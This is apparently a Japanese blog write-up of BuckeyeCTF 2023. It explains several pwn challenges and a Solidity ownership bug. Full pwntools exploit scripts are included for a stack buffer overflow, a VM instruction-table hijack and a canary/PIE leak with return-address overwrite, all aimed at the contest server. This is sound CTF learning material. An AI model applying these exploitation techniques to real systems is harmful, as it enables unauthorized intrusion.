+++
title = "buckeyeCTF 2023"
date = 2023-10-02
description = "Solidityは難しい"
[taxonomies]
tags = ["pwn", "blockchain", "Buffer Overflow"]
+++

[BuckeyeCTF](https://ctftime.org/event/2074)に出場しました。
コンテスト中にpwn5問とmisc1問をとき、コンテスト後にlosslessとaNyFTを追加で解きました。

# [pwn] Beginner Menu

入力された番号に対して`atoi`を呼び出します。

- 1 <= n <= 4 のときは用意された関数を実行し`exit`
- 5 <= n のときは"Not an Option"と表示し`exit`
- そうでない場合はflagを出力

という実装がされているので-1を入力するとflagが出てきます。

Flag: `bctf{y0u_ARe_sNeaKy}`

# [pwn] Starter Buffer

自明なStack Buffer Overflowがあります。flag変数の値を書き換えてあげればいいです。

```py
from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2sh = lambda pl: b"".join([p8(int(pl[i : i + 2], 16)) for i in range(0, len(pl), 2)])
s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def create_io() -> tubes.tube.tube:
    if not local:
        io: tubes.tube.tube = remote(remote_addr, int(remote_port))
    elif debug:
        if radare:
            io: tubes.tube.tube = process(elf_name, env={"LD_PRELOAD": libc_name})
            util.proc.wait_for_debugger(util.proc.pidof(io)[0])
        else:
            io: tubes.tube.tube = gdb.debug(
                elf_name, script, env={"LD_PRELOAD": libc_name}
            )
    else:
        io: tubes.tube.tube = process(elf_name, env={"LD_PRELOAD": libc_name})
    return io


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    sla(b": ", b"A" * 0x3C + p32(0x45454545))

    t.interactive()


local = 0
debug = 0
radare = 0

elf_name = "./buffer"
libc_name = ""
remote_addr, remote_port = "chall.pwnoh.io 13372".split()
elf: ELF = ELF(elf_name)
# libc: ELF = ELF(libc_name)
script = """
"""
t = create_io()
solve()
```

`Flag:bctf{wHy_WriTe_OveR_mY_V@lUeS}`

# [pwn] Igpay Atinlay Natoriay

Rustに実行時エラーを起こさせるとフラグがもらえます。

実験している最中に誤って`ｆ`を入力したらフラグが降ってきました。
落ち着いて考えるとrustはUFT-8として不正な文字列を持てない(はず？)ので、マルチバイト文字を入力するとここでコケます。

```rust
    let first = &word[0..1];
```

`flag:bctf{u$trAy_1SyAy_Af3$ay_aNDy@Y_3cUR3s@y}`

# [pwn] Bugsworld

VM問です。17個の命令が用意されていますが、実際に実装されているのは11個のみです。

## 分析

Bytecodeを与え、盤面の中を自由に動くことができる、というバイナリが渡されます。

セキュリティ機構はすべてonになっています。

- Full RELRO
- Canary found
- NX enabled
- PIE enabled

## 脆弱性

### PIE base leak

win関数が実装されているのでPIE baseのleakさえできればよいです。これは`bytecode[i]`
に入力された値がサニタイズされる前に`printf`が呼び出されていることを利用します。

```c 
  for (int i = 0; i < n; i++) {
    printf("%s", instruction_names[bytecode[i]]);
    if (bytecode[i] < 0 || bytecode[i] > 16) {
      printf("Invalid instruction\n");
    }
    ...
```

### RIPの奪取

VMは一旦入力を受け取ってそれをサニタイズしたら`bytecode[state.pc] != INSTRUCTION_HALT`である限り実行を続けます。

`INSTRUCTION_HALT`は受け取った命令の最後に挿入されます。
すなわちこれを超えることが出来ればその後ろの非サニタイズ済みな命令を実行することができるというわけです。

`INSTRUCTION_HALT`を超えるために使えそうなパスとして`dont_jump`関数があります。
これを我々が呼び出せる最後の命令で実行できれば`INSTRUCTION_HALT`のbypassができそうです。

```c
void dont_jump(State *state) {
  state->pc++;
  state->pc++;
}
```

これは`do_jump_if_not_next_is_empty`から呼び出すことができます。

```c 
void do_jump_if_not_next_is_empty(State *state) {
  if (next_is_out_of_bounds(state))
    do_jump(state);
  else
    dont_jump(state);
}
```

## 攻撃

呼び出しは以下のコードで行われます。

```c
    instruction_table[bytecode[state.pc]](&state);
```

`bytecode[state.pc]`は任意の値にすることができるので
`getFlag`
のアドレスをメモリ上のいずれかに置き、
`instruction_table`
からのオフセットを設定することでRIPが奪取できます。

## スクリプト

```py
from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2sh = lambda pl: b"".join([p8(int(pl[i : i + 2], 16)) for i in range(0, len(pl), 2)])
s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


INSTRUCTION_MOVE = 0
INSTRUCTION_TURNLEFT = 1
INSTRUCTION_TURNRIGHT = 2
INSTRUCTION_INFECT = 3
INSTRUCTION_SKIP = 4
INSTRUCTION_HALT = 5
INSTRUCTION_JUMP = 6
INSTRUCTION_JUMP_IF_NOT_NEXT_IS_EMPTY = 7
INSTRUCTION_JUMP_IF_NOT_NEXT_IS_NOT_EMPTY = 8
INSTRUCTION_JUMP_IF_NOT_NEXT_IS_WALL = 9
INSTRUCTION_JUMP_IF_NOT_NEXT_IS_NOT_WALL = 10
INSTRUCTION_JUMP_IF_NOT_NEXT_IS_FRIEND = 11
INSTRUCTION_JUMP_IF_NOT_NEXT_IS_NOT_FRIEND = 12
INSTRUCTION_JUMP_IF_NOT_NEXT_IS_ENEMY = 13
INSTRUCTION_JUMP_IF_NOT_NEXT_IS_NOT_ENEMY = 14
INSTRUCTION_JUMP_IF_NOT_RANDOM = 15
INSTRUCTION_JUMP_IF_NOT_TRUE = 16


def create_io() -> tubes.tube.tube:
    if not local:
        io: tubes.tube.tube = remote(remote_addr, int(remote_port))
    elif debug:
        if radare:
            io: tubes.tube.tube = process(elf_name, env={"LD_PRELOAD": libc_name})
            util.proc.wait_for_debugger(util.proc.pidof(io)[0])
        else:
            io: tubes.tube.tube = gdb.debug(
                elf_name, script, env={"LD_PRELOAD": libc_name}
            )
    else:
        io: tubes.tube.tube = process(elf_name, env={"LD_PRELOAD": libc_name})
    return io


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    sla(b"bytecode?\n> ", i2b(3))
    t.sendline(i2b(INSTRUCTION_HALT))
    t.sendline(i2b(INSTRUCTION_SKIP))
    t.sendline(i2b(255))
    buf = t.recvuntil(b"Invalid instruction")[: -len("Invalid instruction")]
    buf = buf[buf.find(b"SKIP") + 5 :]
    pie_base = s2u64(buf) - 0x134D
    success(f"{pie_base=:x}")
    assert not pie_base & 0xFFF

    sla(b"bytecode?\n> ", i2b(4))
    t.sendline(i2b(INSTRUCTION_SKIP))
    t.sendline(i2b(INSTRUCTION_SKIP))
    t.sendline(i2b(0xD8 // 8))
    t.sendline(i2b(pie_base + elf.sym["win"]))

    sla(b"bytecode?\n> ", i2b(1))
    t.sendline(i2b(INSTRUCTION_JUMP_IF_NOT_NEXT_IS_EMPTY))

    t.interactive()


local = 0
debug = 0
radare = 0

elf_name = "./bugsworld"
libc_name = "./libc.so.6"
# remote_addr, remote_port = "localhost 60001".split()
remote_addr, remote_port = "chall.pwnoh.io 13382".split()
elf: ELF = ELF(elf_name)
libc: ELF = ELF(libc_name)
script = """
b *run_program+537
"""
t = create_io()
solve()
```

`flag:bctf{7h3_w0rld_15_fu11_0f_bu65_295c62b69}`

# [pwn] FUC

## 分析

0x18Fの正方形の盤面上をwasdで自由に動けます。
この盤面の内1つがあたりのマスとなっていて、そこに動くことでフラグを得ることができます。
ただしトラップのマスも用意されており、そのマスを踏むとプログラムが終了してしまうので、どうにかしてそのマスにたどり着くことが出来ればフラグが得られます。

まず、バイナリの確認をします。セキュリティ機構はすべてオンになっています。

- Full RELRO
- Canary found
- NX enabled
- PIE enabled

## 脆弱性

頑張ってリバーシングをします。

その結果、あたりのマスは盤面の四隅にある0x19の正方形内に存在し、最初にスポーンする位置は `0x25 <= x,y <= 0x183`
であることがわかりました。
加えて2つの脆弱性を見つけました。

1. srand(time(0))
2. 移動方向入力時のBoF

あたりのマスは`random`関数を使って決定されているため、そのシード値が分かればあたりのマスの位置を知ることができます。
しかしマスの初期化フェーズでは0x10000回以上`random`関数が呼ばれており、更にその中には`random`関数の値によって`random`
関数の呼び出し回数が変わるパスもありこの手法は断念しました。

次に移動方向入力時のBoFですが、`sub_2F7A`において`rbp-0xD`に存在する変数に対して0x25byteの入力が行える脆弱性があります。
これを用いてleakとトラップからの復帰を行います。

### canary & PIE base leak

canaryは`rbp-0x8`に存在しており、その1byte目は\x00なので、無効な文字を7文字入力してあげるとleakすることができます。
{{ image(path="static/img.png", caption="canary leak") }}

同様にreturn addressも無効な文字を13文字入力するとleakすることができます。
{{ image(path="static/img1.png", caption="PIE base leak") }}

### トラップからの復帰

ret overwriteを使ってメニュー画面に飛ぶようにするとトラップからの復帰を行えます。
具体的には以下のようなコードを使いました。

```py
loop_addr = p64(pie_base + 0x2F7A)
ret = p64(pie_base + 0x12B8)
t.send(dist + b"A" * 4 + p64(canary) + fake_rbp + ret + loop_addr)
```

以下の画像では、終了メッセージである`it is crushing`のあとも実行が続いていることを確認できます。
{{ image(path="static/img2.png", caption="トラップからの復帰") }}

## 攻撃

以下の手順で解きました。

1. x,yの取得
2. canary, stack base, pie baseのleak
3. 四隅の内最も近いところまで移動
4. 0x19の正方形をすべて探索

注意点として、非本質的なところですがサーバーとの接続は20秒で切れてしまうため`recvuntil`
などを用いて逐次的に命令を実行するのではなく、`recv`でレスポンスをまとめて受け取ると良いです。

{{ image(path="static/img3.png", caption="必要な値のleak") }}

## スクリプト

```py
from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2sh = lambda pl: b"".join([p8(int(pl[i : i + 2], 16)) for i in range(0, len(pl), 2)])
s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def create_io() -> tubes.tube.tube:
    if not local:
        io: tubes.tube.tube = remote(remote_addr, int(remote_port))
    elif debug:
        if radare:
            io: tubes.tube.tube = process(elf_name, env={"LD_PRELOAD": libc_name})
            util.proc.wait_for_debugger(util.proc.pidof(io)[0])
        else:
            io: tubes.tube.tube = gdb.debug(
                [elf_name, "bctf{REDUCTED}"], script, env={"LD_PRELOAD": libc_name}
            )
    else:
        io: tubes.tube.tube = process(
            [elf_name, "bctf{REDUCTED}"], env={"LD_PRELOAD": libc_name}
        )
    return io


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    def safe_move(dist: bytes):
        msg = dist + b"A" * 4 + p64(canary) + fake_rbp + ret + loop_addr
        if b"\x0a" in msg:
            raise Exception("invalid bytes. try again.")
        t.send(msg)

    def do_search():
        info(f"{x=:x} {y=:x}")
        assert x == 0x18 or x == 0x177
        assert y == 0x18 or y == 0x177

        x_dist = b"a" if x == 0x18 else b"d"
        y_dist = b"w" if y == 0x18 else b"s"
        for _ in range(0x18):
            for _ in range(0x18):
                safe_move(y_dist)
            y_dist = b"w" if y_dist == b"s" else b"s"
            safe_move(x_dist)
            buf = t.recv()
            if b"bctf" in buf:
                success("Flag Found!!")
                input("...")
        raise Exception("no flag found here")

    # leak canary & rbp
    sla(b")\n", b"A" * 6)
    buf = t.recvuntil(b"\n(")[:-2]
    buf = buf[buf.find(b"AAAAAA") + 5 :]
    canary, rbp = buf[:8], buf[8:]
    canary = s2u64(canary) & ~0xFF
    rbp = s2u64(rbp)
    success(f"{canary=:x}")
    success(f"{rbp=:x}")

    # get X,Y
    cur = t.recvuntil(b")")[:-1]
    x, y = list(map(int, cur.split(b", ")))
    success(f"{x=} {y=}")

    # leak pie base
    t.sendline(b"A" * 5 + b"B" * 8 + b"C" * 8)
    buf = t.recvuntil(b"\n(")[:-2]
    buf = buf[buf.find(b"C" * 8) + 8 :]
    pie_base = s2u64(buf) - 0x3431
    success(f"{pie_base=:x}")
    assert not pie_base & 0xFFF

    fake_rbp = p64(rbp - 0x280)
    loop_addr = p64(pie_base + 0x2F7A)
    ret = p64(pie_base + 0x12B8)
    t.send(b"A" * 5 + p64(canary + 2) + fake_rbp + ret + loop_addr)
    t.recvuntil(b"Invalid input")
    t.recvline()

    # Go corner
    x_dist = b"a" if x < 0x18F - x else b"d"
    x_times = min(x - 0x18, 0x177 - x)
    info(f"{x:x} {'-' if x_dist==b'a' else '+'} {x_times:x}")

    y_dist = b"w" if y < 0x18F - y else b"s"
    y_times = min(y - 0x18, 0x177 - y)
    info(f"{y:x} {'-' if y_dist=='w' else '+':} {y_times:x}")

    for _ in range(x_times):
        safe_move(x_dist)
        x += -1 if x_dist == b"a" else 1
    for _ in range(y_times):
        safe_move(y_dist)
        y += -1 if y_dist == b"w" else 1

    do_search()
    t.interactive()


local = 0
debug = 0
radare = 0

elf_name = "./maze"
libc_name = ""
remote_addr, remote_port = "chall.pwnoh.io 13387".split()
elf: ELF = ELF(elf_name)
# libc: ELF = ELF(libc_name)
script = """
"""
found = False
for _ in range(0x300):
    if found:
        break
    t = create_io()
    try:
        solve()
    except Exception as e:
        warn(e)
        if debug:
            input("debugging...")
    finally:
        t.close()
```

`flag: bctf{YouHavePwndDeath,ToYouGoesAFlag}`

# [misc] New Management

Blockchain問です。Sepolia TestnetにデプロイされたSmart ContractにFlagを吐かせることが目標です。

脆弱性は自明で、`transferOwnership`にチェックがついていません。
自分をOwnerにして`balance[msg.sender]`を増やすとFlagを得ることができます。
`flag: bctf{wh0_put_y0u_1n_ch4rg3}`

# [pwn] LossLess

WIP

# [misc] aNyFT

WIP

# 終わりに

72時間CTFはいいですね。頭を冷やす時間あって、ゆっくり考えることができました。

唯一の不満はヒープガチャがなかったことですね。寂しかった。